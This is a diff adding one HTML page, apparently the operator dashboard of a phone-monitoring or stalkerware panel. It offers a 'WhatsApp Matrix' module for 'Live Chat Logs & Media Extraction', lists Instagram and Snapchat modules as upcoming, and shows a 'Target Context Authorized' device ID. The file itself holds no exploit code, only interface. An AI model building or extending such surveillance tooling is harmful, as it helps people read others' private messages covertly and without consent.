@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instant Messaging Hub - RS OWNER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root { 
+            --bg-main: #0d1117; 
+            --bg-card: #161b22; 
+            --text-main: #e6edf3; 
+            --text-muted: #8b949e; 
+            --accent-cyan: #2f81f7;
+            --border-color: #30363d;
+            --whatsapp-green: #25D366;
+        }
+        body { background-color: var(--bg-main); color: var(--text-main); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; min-height: 100vh; }
+        .glass-panel { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
+    </style>
+</head>
+<body class="p-4 md:p-6 flex justify-center">
+
+    <div class="w-full max-w-2xl flex flex-col gap-6">
+        
+        <!-- Header Section -->
+        <div class="flex items-center gap-4 bg-[var(--bg-card)] p-4 border border-[var(--border-color)] rounded-xl sticky top-4 z-10 shadow-lg shadow-black/50">
+            <!-- PICHLE PAGE PAR JANE KE LIYE BACK BUTTON -->
+            <button onclick="window.history.back()" class="p-2 rounded-lg bg-[rgba(255,255,255,0.05)] hover:bg-[rgba(255,255,255,0.1)] transition-colors text-[var(--text-muted)] hover:text-white">
+                <i data-lucide="chevron-left" class="w-6 h-6"></i>
+            </button>
+            <div class="flex flex-col">
+                <h1 class="text-xl font-bold text-white tracking-wide uppercase flex items-center gap-2">
+                    <i data-lucide="message-square" class="w-5 h-5 text-[var(--accent-cyan)]"></i>
+                    Instant Messaging
+                </h1>
+                <span class="text-xs text-[var(--text-muted)] font-mono mt-0.5" id="target-context">Target Context Authorized [ID: Fetching...]</span>
+            </div>
+        </div>
+
+        <!-- Social Modules Grid -->
+        <div class="flex flex-col gap-4">
+            
+            <!-- 🟢 WHATSAPP MODULE (ACTIVE) -->
+            <a href="/whatsapp" class="flex items-center justify-between p-5 bg-[var(--bg-card)] border border-[var(--border-color)] rounded-xl hover:bg-[rgba(37,211,102,0.05)] hover:border-[var(--whatsapp-green)] transition-all group relative overflow-hidden">
+                <div class="absolute top-0 right-0 w-1 h-full bg-[var(--whatsapp-green)] opacity-50 group-hover:opacity-100 transition-opacity"></div>
+                <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[rgba(255,255,255,0.05)] rounded-lg group-hover:bg-[rgba(37,211,102,0.1)] transition-colors">
+                        <i data-lucide="message-circle" class="w-7 h-7 text-[var(--text-muted)] group-hover:text-[var(--whatsapp-green)]"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-bold text-lg tracking-wide uppercase">WhatsApp Matrix</h3>
+                        <p class="text-[var(--text-muted)] text-xs font-mono mt-1">Live Chat Logs & Media Extraction</p>
+                    </div>
+                </div>
+                <i data-lucide="chevron-right" class="text-[var(--text-muted)] group-hover:text-[var(--whatsapp-green)]"></i>
+            </a>
+
+            <!-- 🟣 INSTAGRAM MODULE (COMING SOON) -->
+            <div class="flex items-center justify-between p-5 bg-[var(--bg-card)] border border-[var(--border-color)] rounded-xl opacity-60 cursor-not-allowed">
+                <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[rgba(255,255,255,0.05)] rounded-lg">
+                        <i data-lucide="instagram" class="w-7 h-7 text-[var(--text-muted)]"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-bold text-lg tracking-wide uppercase flex items-center gap-2">
+                            Instagram DMs
+                            <span class="text-[9px] bg-red-500/20 text-red-400 border border-red-500/30 px-2 py-0.5 rounded uppercase font-bold">Upcoming Module</span>
+                        </h3>
+                        <p class="text-[var(--text-muted)] text-xs font-mono mt-1">Under Architecture Development</p>
+                    </div>
+                </div>
+                <i data-lucide="lock" class="text-[var(--text-muted)] w-5 h-5"></i>
+            </div>
+
+            <!-- 🟡 SNAPCHAT MODULE (COMING SOON) -->
+            <div class="flex items-center justify-between p-5 bg-[var(--bg-card)] border border-[var(--border-color)] rounded-xl opacity-60 cursor-not-allowed">
+                <div class="flex items-center gap-4">
+                    <div class="p-3 bg-[rgba(255,255,255,0.05)] rounded-lg">
+                        <i data-lucide="ghost" class="w-7 h-7 text-[var(--text-muted)]"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-bold text-lg tracking-wide uppercase flex items-center gap-2">
+                            Snapchat Vault
+                            <span class="text-[9px] bg-red-500/20 text-red-400 border border-red-500/30 px-2 py-0.5 rounded uppercase font-bold">Upcoming Module</span>
+                        </h3>
+                        <p class="text-[var(--text-muted)] text-xs font-mono mt-1">Under Architecture Development</p>
+                    </div>
+                </div>
+                <i data-lucide="lock" class="text-[var(--text-muted)] w-5 h-5"></i>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        
+        // Dynamically load device ID to look professional
+        document.addEventListener("DOMContentLoaded", () => {
+            const deviceId = localStorage.getItem('active_device_id');
+            if(deviceId) {
+                document.getElementById('target-context').innerText = `Target Context Authorized [ID: ${deviceId.substring(0,8)}...]`;
+            }
+        });
+    </script>
+</body>
+</html>
